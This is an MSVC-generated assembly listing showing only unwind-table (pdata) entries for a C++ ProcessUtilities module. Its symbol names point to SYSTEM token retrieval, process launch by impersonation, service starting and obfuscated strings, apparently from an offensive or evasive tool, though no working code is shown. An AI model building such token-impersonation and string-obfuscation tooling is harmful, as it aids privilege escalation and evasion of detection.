	DD	imagerel $unwind$??R<lambda_1>@?1??GetSystemToken@ProcessUtilities@@YAPEAXXZ@QEBAAEAV?$obfuscated_data@$0N@$0?EEFGJGBAAMNIAIKN@D@ay@@XZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?dtor$0@?0???R<lambda_1>@?1??GetSystemToken@ProcessUtilities@@YAPEAXXZ@QEBAAEAV?$obfuscated_data@$0N@$0?EEFGJGBAAMNIAIKN@D@ay@@XZ@4HA DD imagerel ?dtor$0@?0???R<lambda_1>@?1??GetSystemToken@ProcessUtilities@@YAPEAXXZ@QEBAAEAV?$obfuscated_data@$0N@$0?EEFGJGBAAMNIAIKN@D@ay@@XZ@4HA
	DD	imagerel ?dtor$0@?0???R<lambda_1>@?1??GetSystemToken@ProcessUtilities@@YAPEAXXZ@QEBAAEAV?$obfuscated_data@$0N@$0?EEFGJGBAAMNIAIKN@D@ay@@XZ@4HA+87
	DD	imagerel $unwind$?dtor$0@?0???R<lambda_1>@?1??GetSystemToken@ProcessUtilities@@YAPEAXXZ@QEBAAEAV?$obfuscated_data@$0N@$0?EEFGJGBAAMNIAIKN@D@ay@@XZ@4HA
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??R<lambda_4>@?1??StartWindowsService@ProcessUtilities@@YAKV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@QEBAAEAV?$obfuscated_data@$0O@$0BLHFLNBBBJKDBPFN@D@ay@@XZ DD imagerel ??R<lambda_4>@?1??StartWindowsService@ProcessUtilities@@YAKV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@QEBAAEAV?$obfuscated_data@$0O@$0BLHFLNBBBJKDBPFN@D@ay@@XZ
	DD	imagerel ??R<lambda_4>@?1??StartWindowsService@ProcessUtilities@@YAKV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@QEBAAEAV?$obfuscated_data@$0O@$0BLHFLNBBBJKDBPFN@D@ay@@XZ+115
	DD	imagerel $unwind$??R<lambda_4>@?1??StartWindowsService@ProcessUtilities@@YAKV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@QEBAAEAV?$obfuscated_data@$0O@$0BLHFLNBBBJKDBPFN@D@ay@@XZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?dtor$0@?0???R<lambda_4>@?1??StartWindowsService@ProcessUtilities@@YAKV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@QEBAAEAV?$obfuscated_data@$0O@$0BLHFLNBBBJKDBPFN@D@ay@@XZ@4HA DD imagerel ?dtor$0@?0???R<lambda_4>@?1??StartWindowsService@ProcessUtilities@@YAKV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@QEBAAEAV?$obfuscated_data@$0O@$0BLHFLNBBBJKDBPFN@D@ay@@XZ@4HA
	DD	imagerel ?dtor$0@?0???R<lambda_4>@?1??StartWindowsService@ProcessUtilities@@YAKV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@QEBAAEAV?$obfuscated_data@$0O@$0BLHFLNBBBJKDBPFN@D@ay@@XZ@4HA+87
	DD	imagerel $unwind$?dtor$0@?0???R<lambda_4>@?1??StartWindowsService@ProcessUtilities@@YAKV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@QEBAAEAV?$obfuscated_data@$0O@$0BLHFLNBBBJKDBPFN@D@ay@@XZ@4HA
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??R<lambda_3>@?1??StartWindowsService@ProcessUtilities@@YAKV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@QEBAAEAV?$obfuscated_data@$0BF@$0FHJHDFKLONPDMJDB@D@ay@@XZ DD imagerel ??R<lambda_3>@?1??StartWindowsService@ProcessUtilities@@YAKV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@QEBAAEAV?$obfuscated_data@$0BF@$0FHJHDFKLONPDMJDB@D@ay@@XZ
	DD	imagerel ??R<lambda_3>@?1??StartWindowsService@ProcessUtilities@@YAKV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@QEBAAEAV?$obfuscated_data@$0BF@$0FHJHDFKLONPDMJDB@D@ay@@XZ+159
	DD	imagerel $unwind$??R<lambda_3>@?1??StartWindowsService@ProcessUtilities@@YAKV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@QEBAAEAV?$obfuscated_data@$0BF@$0FHJHDFKLONPDMJDB@D@ay@@XZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?dtor$0@?0???R<lambda_3>@?1??StartWindowsService@ProcessUtilities@@YAKV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@QEBAAEAV?$obfuscated_data@$0BF@$0FHJHDFKLONPDMJDB@D@ay@@XZ@4HA DD imagerel ?dtor$0@?0???R<lambda_3>@?1??StartWindowsService@ProcessUtilities@@YAKV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@QEBAAEAV?$obfuscated_data@$0BF@$0FHJHDFKLONPDMJDB@D@ay@@XZ@4HA
	DD	imagerel ?dtor$0@?0???R<lambda_3>@?1??StartWindowsService@ProcessUtilities@@YAKV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@QEBAAEAV?$obfuscated_data@$0BF@$0FHJHDFKLONPDMJDB@D@ay@@XZ@4HA+87
	DD	imagerel $unwind$?dtor$0@?0???R<lambda_3>@?1??StartWindowsService@ProcessUtilities@@YAKV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@QEBAAEAV?$obfuscated_data@$0BF@$0FHJHDFKLONPDMJDB@D@ay@@XZ@4HA
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??R<lambda_2>@?1??StartWindowsService@ProcessUtilities@@YAKV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@QEBAAEAV?$obfuscated_data@$0P@$0BPDLBGPANDNDDDN@D@ay@@XZ DD imagerel ??R<lambda_2>@?1??StartWindowsService@ProcessUtilities@@YAKV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@QEBAAEAV?$obfuscated_data@$0P@$0BPDLBGPANDNDDDN@D@ay@@XZ
	DD	imagerel ??R<lambda_2>@?1??StartWindowsService@ProcessUtilities@@YAKV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@QEBAAEAV?$obfuscated_data@$0P@$0BPDLBGPANDNDDDN@D@ay@@XZ+112
	DD	imagerel $unwind$??R<lambda_2>@?1??StartWindowsService@ProcessUtilities@@YAKV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@QEBAAEAV?$obfuscated_data@$0P@$0BPDLBGPANDNDDDN@D@ay@@XZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?dtor$0@?0???R<lambda_2>@?1??StartWindowsService@ProcessUtilities@@YAKV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@QEBAAEAV?$obfuscated_data@$0P@$0BPDLBGPANDNDDDN@D@ay@@XZ@4HA DD imagerel ?dtor$0@?0???R<lambda_2>@?1??StartWindowsService@ProcessUtilities@@YAKV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@QEBAAEAV?$obfuscated_data@$0P@$0BPDLBGPANDNDDDN@D@ay@@XZ@4HA
	DD	imagerel ?dtor$0@?0???R<lambda_2>@?1??StartWindowsService@ProcessUtilities@@YAKV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@QEBAAEAV?$obfuscated_data@$0P@$0BPDLBGPANDNDDDN@D@ay@@XZ@4HA+87
	DD	imagerel $unwind$?dtor$0@?0???R<lambda_2>@?1??StartWindowsService@ProcessUtilities@@YAKV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@QEBAAEAV?$obfuscated_data@$0P@$0BPDLBGPANDNDDDN@D@ay@@XZ@4HA
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??R<lambda_1>@?1??StartWindowsService@ProcessUtilities@@YAKV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@QEBAAEAV?$obfuscated_data@$0N@$0HNCBMLEFJHLPKHNB@D@ay@@XZ DD imagerel ??R<lambda_1>@?1??StartWindowsService@ProcessUtilities@@YAKV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@QEBAAEAV?$obfuscated_data@$0N@$0HNCBMLEFJHLPKHNB@D@ay@@XZ
	DD	imagerel ??R<lambda_1>@?1??StartWindowsService@ProcessUtilities@@YAKV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@QEBAAEAV?$obfuscated_data@$0N@$0HNCBMLEFJHLPKHNB@D@ay@@XZ+111
	DD	imagerel $unwind$??R<lambda_1>@?1??StartWindowsService@ProcessUtilities@@YAKV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@QEBAAEAV?$obfuscated_data@$0N@$0HNCBMLEFJHLPKHNB@D@ay@@XZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?dtor$0@?0???R<lambda_1>@?1??StartWindowsService@ProcessUtilities@@YAKV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@QEBAAEAV?$obfuscated_data@$0N@$0HNCBMLEFJHLPKHNB@D@ay@@XZ@4HA DD imagerel ?dtor$0@?0???R<lambda_1>@?1??StartWindowsService@ProcessUtilities@@YAKV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@QEBAAEAV?$obfuscated_data@$0N@$0HNCBMLEFJHLPKHNB@D@ay@@XZ@4HA
	DD	imagerel ?dtor$0@?0???R<lambda_1>@?1??StartWindowsService@ProcessUtilities@@YAKV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@QEBAAEAV?$obfuscated_data@$0N@$0HNCBMLEFJHLPKHNB@D@ay@@XZ@4HA+87
	DD	imagerel $unwind$?dtor$0@?0???R<lambda_1>@?1??StartWindowsService@ProcessUtilities@@YAKV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@QEBAAEAV?$obfuscated_data@$0N@$0HNCBMLEFJHLPKHNB@D@ay@@XZ@4HA
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??R<lambda_1>@?1??OpenProcessAsImposter@ProcessUtilities@@YAHPEAXKPEB_WPEA_WK01PEAU_STARTUPINFOW@@PEAU_PROCESS_INFORMATION@@@Z@QEBAAEAV?$obfuscated_data@$0BI@$0?ONOEALOLKHONGJN@D@ay@@XZ DD imagerel ??R<lambda_1>@?1??OpenProcessAsImposter@ProcessUtilities@@YAHPEAXKPEB_WPEA_WK01PEAU_STARTUPINFOW@@PEAU_PROCESS_INFORMATION@@@Z@QEBAAEAV?$obfuscated_data@$0BI@$0?ONOEALOLKHONGJN@D@ay@@XZ
	DD	imagerel ??R<lambda_1>@?1??OpenProcessAsImposter@ProcessUtilities@@YAHPEAXKPEB_WPEA_WK01PEAU_STARTUPINFOW@@PEAU_PROCESS_INFORMATION@@@Z@QEBAAEAV?$obfuscated_data@$0BI@$0?ONOEALOLKHONGJN@D@ay@@XZ+167
	DD	imagerel $unwind$??R<lambda_1>@?1??OpenProcessAsImposter@ProcessUtilities@@YAHPEAXKPEB_WPEA_WK01PEAU_STARTUPINFOW@@PEAU_PROCESS_INFORMATION@@@Z@QEBAAEAV?$obfuscated_data@$0BI@$0?ONOEALOLKHONGJN@D@ay@@XZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?dtor$0@?0???R<lambda_1>@?1??OpenProcessAsImposter@ProcessUtilities@@YAHPEAXKPEB_WPEA_WK01PEAU_STARTUPINFOW@@PEAU_PROCESS_INFORMATION@@@Z@QEBAAEAV?$obfuscated_data@$0BI@$0?ONOEALOLKHONGJN@D@ay@@XZ@4HA DD imagerel ?dtor$0@?0???R<lambda_1>@?1??OpenProcessAsImposter@ProcessUtilities@@YAHPEAXKPEB_WPEA_WK01PEAU_STARTUPINFOW@@PEAU_PROCESS_INFORMATION@@@Z@QEBAAEAV?$obfuscated_data@$0BI@$0?ONOEALOLKHONGJN@D@ay@@XZ@4HA
	DD	imagerel ?dtor$0@?0???R<lambda_1>@?1??OpenProcessAsImposter@ProcessUtilities@@YAHPEAXKPEB_WPEA_WK01PEAU_STARTUPINFOW@@PEAU_PROCESS_INFORMATION@@@Z@QEBAAEAV?$obfuscated_data@$0BI@$0?ONOEALOLKHONGJN@D@ay@@XZ@4HA+87
	DD	imagerel $unwind$?dtor$0@?0???R<lambda_1>@?1??OpenProcessAsImposter@ProcessUtilities@@YAHPEAXKPEB_WPEA_WK01PEAU_STARTUPINFOW@@PEAU_PROCESS_INFORMATION@@@Z@QEBAAEAV?$obfuscated_data@$0BI@$0?ONOEALOLKHONGJN@D@ay@@XZ@4HA
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??R<lambda_1>@?1??HaltProcessExecution@ProcessUtilities@@YAXXZ@QEBAAEAV?$obfuscated_data@$0BP@$0?GGDGEMJMMGFOMGGP@D@ay@@XZ DD imagerel ??R<lambda_1>@?1??HaltProcessExecution@ProcessUtilities@@YAXXZ@QEBAAEAV?$obfuscated_data@$0BP@$0?GGDGEMJMMGFOMGGP@D@ay@@XZ
	DD	imagerel ??R<lambda_1>@?1??HaltProcessExecution@ProcessUtilities@@YAXXZ@QEBAAEAV?$obfuscated_data@$0BP@$0?GGDGEMJMMGFOMGGP@D@ay@@XZ+226
	DD	imagerel $unwind$??R<lambda_1>@?1??HaltProcessExecution@ProcessUtilities@@YAXXZ@QEBAAEAV?$obfuscated_data@$0BP@$0?GGDGEMJMMGFOMGGP@D@ay@@XZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?dtor$0@?0???R<lambda_1>@?1??HaltProcessExecution@ProcessUtilities@@YAXXZ@QEBAAEAV?$obfuscated_data@$0BP@$0?GGDGEMJMMGFOMGGP@D@ay@@XZ@4HA DD imagerel ?dtor$0@?0???R<lambda_1>@?1??HaltProcessExecution@ProcessUtilities@@YAXXZ@QEBAAEAV?$obfuscated_data@$0BP@$0?GGDGEMJMMGFOMGGP@D@ay@@XZ@4HA
	DD	imagerel ?dtor$0@?0???R<lambda_1>@?1??HaltProcessExecution@ProcessUtilities@@YAXXZ@QEBAAEAV?$obfuscated_data@$0BP@$0?GGDGEMJMMGFOMGGP@D@ay@@XZ@4HA+87
	DD	imagerel $unwind$?dtor$0@?0???R<lambda_1>@?1??HaltProcessExecution@ProcessUtilities@@YAXXZ@QEBAAEAV?$obfuscated_data@$0BP@$0?GGDGEMJMMGFOMGGP@D@ay@@XZ@4HA
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?HaltProcessExecution@ProcessUtilities@@YAXXZ DD imagerel $LN28
	DD	imagerel $LN28+230
	DD	imagerel $unwind$?HaltProcessExecution@ProcessUtilities@@YAXXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?dtor$0@?0??HaltProcessExecution@ProcessUtilities@@YAXXZ@4HA DD imagerel ?dtor$0@?0??HaltProcessExecution@ProcessUtilities@@YAXXZ@4HA
	DD	imagerel ?dtor$0@?0??HaltProcessExecution@ProcessUtilities@@YAXXZ@4HA+87
	DD	imagerel $unwind$?dtor$0@?0??HaltProcessExecution@ProcessUtilities@@YAXXZ@4HA
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??R<lambda_3>@?1??PIDFromName@ProcessUtilities@@YAKPEBD@Z@QEBAAEAV?$obfuscated_data@$0P@$0CHMPGHGPPBJFDPJN@D@ay@@XZ DD imagerel ??R<lambda_3>@?1??PIDFromName@ProcessUtilities@@YAKPEBD@Z@QEBAAEAV?$obfuscated_data@$0P@$0CHMPGHGPPBJFDPJN@D@ay@@XZ
	DD	imagerel ??R<lambda_3>@?1??PIDFromName@ProcessUtilities@@YAKPEBD@Z@QEBAAEAV?$obfuscated_data@$0P@$0CHMPGHGPPBJFDPJN@D@ay@@XZ+112
	DD	imagerel $unwind$??R<lambda_3>@?1??PIDFromName@ProcessUtilities@@YAKPEBD@Z@QEBAAEAV?$obfuscated_data@$0P@$0CHMPGHGPPBJFDPJN@D@ay@@XZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?dtor$0@?0???R<lambda_3>@?1??PIDFromName@ProcessUtilities@@YAKPEBD@Z@QEBAAEAV?$obfuscated_data@$0P@$0CHMPGHGPPBJFDPJN@D@ay@@XZ@4HA DD imagerel ?dtor$0@?0???R<lambda_3>@?1??PIDFromName@ProcessUtilities@@YAKPEBD@Z@QEBAAEAV?$obfuscated_data@$0P@$0CHMPGHGPPBJFDPJN@D@ay@@XZ@4HA
	DD	imagerel ?dtor$0@?0???R<lambda_3>@?1??PIDFromName@ProcessUtilities@@YAKPEBD@Z@QEBAAEAV?$obfuscated_data@$0P@$0CHMPGHGPPBJFDPJN@D@ay@@XZ@4HA+87
	DD	imagerel $unwind$?dtor$0@?0???R<lambda_3>@?1??PIDFromName@ProcessUtilities@@YAKPEBD@Z@QEBAAEAV?$obfuscated_data@$0P@$0CHMPGHGPPBJFDPJN@D@ay@@XZ@4HA
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??R<lambda_2>@?1??PIDFromName@ProcessUtilities@@YAKPEBD@Z@QEBAAEAV?$obfuscated_data@$0BA@$0?BKIAEAOAIEMIKIGP@D@ay@@XZ DD imagerel ??R<lambda_2>@?1??PIDFromName@ProcessUtilities@@YAKPEBD@Z@QEBAAEAV?$obfuscated_data@$0BA@$0?BKIAEAOAIEMIKIGP@D@ay@@XZ
	DD	imagerel ??R<lambda_2>@?1??PIDFromName@ProcessUtilities@@YAKPEBD@Z@QEBAAEAV?$obfuscated_data@$0BA@$0?BKIAEAOAIEMIKIGP@D@ay@@XZ+129
	DD	imagerel $unwind$??R<lambda_2>@?1??PIDFromName@ProcessUtilities@@YAKPEBD@Z@QEBAAEAV?$obfuscated_data@$0BA@$0?BKIAEAOAIEMIKIGP@D@ay@@XZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?dtor$0@?0???R<lambda_2>@?1??PIDFromName@ProcessUtilities@@YAKPEBD@Z@QEBAAEAV?$obfuscated_data@$0BA@$0?BKIAEAOAIEMIKIGP@D@ay@@XZ@4HA DD imagerel ?dtor$0@?0???R<lambda_2>@?1??PIDFromName@ProcessUtilities@@YAKPEBD@Z@QEBAAEAV?$obfuscated_data@$0BA@$0?BKIAEAOAIEMIKIGP@D@ay@@XZ@4HA
	DD	imagerel ?dtor$0@?0???R<lambda_2>@?1??PIDFromName@ProcessUtilities@@YAKPEBD@Z@QEBAAEAV?$obfuscated_data@$0BA@$0?BKIAEAOAIEMIKIGP@D@ay@@XZ@4HA+87
	DD	imagerel $unwind$?dtor$0@?0???R<lambda_2>@?1??PIDFromName@ProcessUtilities@@YAKPEBD@Z@QEBAAEAV?$obfuscated_data@$0BA@$0?BKIAEAOAIEMIKIGP@D@ay@@XZ@4HA
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??R<lambda_1>@?1??PIDFromName@ProcessUtilities@@YAKPEBD@Z@QEBAAEAV?$obfuscated_data@$0BJ@$0HBHPFNAPILJNJLOH@D@ay@@XZ DD imagerel ??R<lambda_1>@?1??PIDFromName@ProcessUtilities@@YAKPEBD@Z@QEBAAEAV?$obfuscated_data@$0BJ@$0HBHPFNAPILJNJLOH@D@ay@@XZ
	DD	imagerel ??R<lambda_1>@?1??PIDFromName@ProcessUtilities@@YAKPEBD@Z@QEBAAEAV?$obfuscated_data@$0BJ@$0HBHPFNAPILJNJLOH@D@ay@@XZ+175
	DD	imagerel $unwind$??R<lambda_1>@?1??PIDFromName@ProcessUtilities@@YAKPEBD@Z@QEBAAEAV?$obfuscated_data@$0BJ@$0HBHPFNAPILJNJLOH@D@ay@@XZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?dtor$0@?0???R<lambda_1>@?1??PIDFromName@ProcessUtilities@@YAKPEBD@Z@QEBAAEAV?$obfuscated_data@$0BJ@$0HBHPFNAPILJNJLOH@D@ay@@XZ@4HA DD imagerel ?dtor$0@?0???R<lambda_1>@?1??PIDFromName@ProcessUtilities@@YAKPEBD@Z@QEBAAEAV?$obfuscated_data@$0BJ@$0HBHPFNAPILJNJLOH@D@ay@@XZ@4HA
	DD	imagerel ?dtor$0@?0???R<lambda_1>@?1??PIDFromName@ProcessUtilities@@YAKPEBD@Z@QEBAAEAV?$obfuscated_data@$0BJ@$0HBHPFNAPILJNJLOH@D@ay@@XZ@4HA+87
	DD	imagerel $unwind$?dtor$0@?0???R<lambda_1>@?1??PIDFromName@ProcessUtilities@@YAKPEBD@Z@QEBAAEAV?$obfuscated_data@$0BJ@$0HBHPFNAPILJNJLOH@D@ay@@XZ@4HA
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?PIDFromName@ProcessUtilities@@YAKPEBD@Z DD imagerel $LN235
	DD	imagerel $LN235+1253
	DD	imagerel $unwind$?PIDFromName@ProcessUtilities@@YAKPEBD@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?dtor$6@?0??PIDFromName@ProcessUtilities@@YAKPEBD@Z@4HA DD imagerel ?dtor$6@?0??PIDFromName@ProcessUtilities@@YAKPEBD@Z@4HA
	DD	imagerel ?dtor$6@?0??PIDFromName@ProcessUtilities@@YAKPEBD@Z@4HA+87
	DD	imagerel $unwind$?dtor$6@?0??PIDFromName@ProcessUtilities@@YAKPEBD@Z@4HA
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?dtor$10@?0??PIDFromName@ProcessUtilities@@YAKPEBD@Z@4HA DD imagerel ?dtor$10@?0??PIDFromName@ProcessUtilities@@YAKPEBD@Z@4HA
	DD	imagerel ?dtor$10@?0??PIDFromName@ProcessUtilities@@YAKPEBD@Z@4HA+87
	DD	imagerel $unwind$?dtor$10@?0??PIDFromName@ProcessUtilities@@YAKPEBD@Z@4HA
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?dtor$11@?0??PIDFromName@ProcessUtilities@@YAKPEBD@Z@4HA DD imagerel ?dtor$11@?0??PIDFromName@ProcessUtilities@@YAKPEBD@Z@4HA
	DD	imagerel ?dtor$11@?0??PIDFromName@ProcessUtilities@@YAKPEBD@Z@4HA+87
	DD	imagerel $unwind$?dtor$11@?0??PIDFromName@ProcessUtilities@@YAKPEBD@Z@4HA
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?dtor$5@?0??PIDFromName@ProcessUtilities@@YAKPEBD@Z@4HA DD imagerel ?dtor$5@?0??PIDFromName@ProcessUtilities@@YAKPEBD@Z@4HA
	DD	imagerel ?dtor$5@?0??PIDFromName@ProcessUtilities@@YAKPEBD@Z@4HA+29
	DD	imagerel $unwind$?dtor$5@?0??PIDFromName@ProcessUtilities@@YAKPEBD@Z@4HA
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??R<lambda_1>@?1??Init@ProcessUtilities@@YAHXZ@QEBAAEAV?$obfuscated_data@$0M@$0?BEBOLOIGHKNGJACB@D@ay@@XZ DD imagerel ??R<lambda_1>@?1??Init@ProcessUtilities@@YAHXZ@QEBAAEAV?$obfuscated_data@$0M@$0?BEBOLOIGHKNGJACB@D@ay@@XZ
	DD	imagerel ??R<lambda_1>@?1??Init@ProcessUtilities@@YAHXZ@QEBAAEAV?$obfuscated_data@$0M@$0?BEBOLOIGHKNGJACB@D@ay@@XZ+114
	DD	imagerel $unwind$??R<lambda_1>@?1??Init@ProcessUtilities@@YAHXZ@QEBAAEAV?$obfuscated_data@$0M@$0?BEBOLOIGHKNGJACB@D@ay@@XZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?dtor$0@?0???R<lambda_1>@?1??Init@ProcessUtilities@@YAHXZ@QEBAAEAV?$obfuscated_data@$0M@$0?BEBOLOIGHKNGJACB@D@ay@@XZ@4HA DD imagerel ?dtor$0@?0???R<lambda_1>@?1??Init@ProcessUtilities@@YAHXZ@QEBAAEAV?$obfuscated_data@$0M@$0?BEBOLOIGHKNGJACB@D@ay@@XZ@4HA
	DD	imagerel ?dtor$0@?0???R<lambda_1>@?1??Init@ProcessUtilities@@YAHXZ@QEBAAEAV?$obfuscated_data@$0M@$0?BEBOLOIGHKNGJACB@D@ay@@XZ@4HA+87
	DD	imagerel $unwind$?dtor$0@?0???R<lambda_1>@?1??Init@ProcessUtilities@@YAHXZ@QEBAAEAV?$obfuscated_data@$0M@$0?BEBOLOIGHKNGJACB@D@ay@@XZ@4HA
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?GetLoadedLib@ProcessUtilities@@YAPEAUHINSTANCE__@@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z DD imagerel $LN239
	DD	imagerel $LN239+635
	DD	imagerel $unwind$?GetLoadedLib@ProcessUtilities@@YAPEAUHINSTANCE__@@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?PWSTRToString@ProcessUtilities@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEA_W@Z DD imagerel $LN59
	DD	imagerel $LN59+257
	DD	imagerel $unwind$?PWSTRToString@ProcessUtilities@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEA_W@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?dtor$2@?0??PWSTRToString@ProcessUtilities@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEA_W@Z@4HA DD imagerel ?dtor$2@?0??PWSTRToString@ProcessUtilities@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEA_W@Z@4HA
	DD	imagerel ?dtor$2@?0??PWSTRToString@ProcessUtilities@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEA_W@Z@4HA+29
	DD	imagerel $unwind$?dtor$2@?0??PWSTRToString@ProcessUtilities@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEA_W@Z@4HA
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?_sub@ProcessUtilities@@YAHV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@0@Z DD imagerel ?_sub@ProcessUtilities@@YAHV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@0@Z
	DD	imagerel ?_sub@ProcessUtilities@@YAHV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@0@Z+25
	DD	imagerel $unwind$?_sub@ProcessUtilities@@YAHV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@0@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$3$?_sub@ProcessUtilities@@YAHV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@0@Z DD imagerel ?_sub@ProcessUtilities@@YAHV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@0@Z+25
	DD	imagerel ?_sub@ProcessUtilities@@YAHV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@0@Z+224
	DD	imagerel $chain$3$?_sub@ProcessUtilities@@YAHV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@0@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$4$?_sub@ProcessUtilities@@YAHV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@0@Z DD imagerel ?_sub@ProcessUtilities@@YAHV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@0@Z+224
	DD	imagerel ?_sub@ProcessUtilities@@YAHV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@0@Z+373
	DD	imagerel $chain$4$?_sub@ProcessUtilities@@YAHV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@0@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$5$?_sub@ProcessUtilities@@YAHV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@0@Z DD imagerel ?_sub@ProcessUtilities@@YAHV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@0@Z+373
	DD	imagerel ?_sub@ProcessUtilities@@YAHV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@0@Z+381
	DD	imagerel $chain$5$?_sub@ProcessUtilities@@YAHV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@0@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$6$?_sub@ProcessUtilities@@YAHV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@0@Z DD imagerel ?_sub@ProcessUtilities@@YAHV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@0@Z+381
	DD	imagerel ?_sub@ProcessUtilities@@YAHV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@0@Z+387
